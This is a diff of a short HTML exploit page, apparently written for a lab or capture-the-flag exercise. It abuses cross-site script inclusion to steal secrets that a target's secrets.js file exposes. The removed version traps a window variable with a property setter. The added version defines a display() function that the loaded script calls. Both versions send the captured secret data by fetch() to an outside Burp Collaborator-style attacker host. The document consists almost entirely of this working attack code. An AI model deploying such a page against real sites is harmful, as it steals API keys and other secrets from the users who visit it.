@@ -1,25 +1,23 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <!-- 
+      1. DEFINE THE FUNCTION TO INTERCEPT DATA
+      The target page defines 'display(data)', so we define it here first.
+      When secrets.js loads and runs, it will call OUR version of display.
+    -->
     <script>
-        // 1. Intercept the variable assignment.
-        // IMPORTANT: Open secrets.js to see the variable name.
-        // If the file has "var apiKey = ...", change 'secret' below to 'apiKey'.
-        var stolenSecret = "";
-
-        Object.defineProperty(window, 'VARIABLE_NAME', {
-            set: function(value) {
-                stolenSecret = value;
-                // 2. Send ONLY the key to the remote attacker server
-                fetch('https://x5347mp4q09f9w2s2iumyh08jzpqdj18.oastify.com/collect?secret=' + encodeURIComponent(value));
-            },
-            get: function() {
-                return stolenSecret;
-            }
-        });
+        function display(data) {
+            // 2. SEND THE DATA TO THE REMOTE ATTACKER SERVER
+            // 'data' is the object containing the secret keys.
+            fetch('https://jobqq88q9ms1silel4d8h3ju2l8cw6kv.oastify.com/exploit?secret=' + encodeURIComponent(JSON.stringify(data)));
+        }
     </script>
 
-    <!-- 3. Load the target script to trigger the setter -->
+    <!-- 
+      3. LOAD THE VULNERABLE SCRIPT
+      This script will execute and call display(data) immediately.
+    -->
     <script src="https://ptl-fa1bb21ced03-32651dfe4fdc.libcurl.me/secrets.js"></script>
 </body>
 </html>
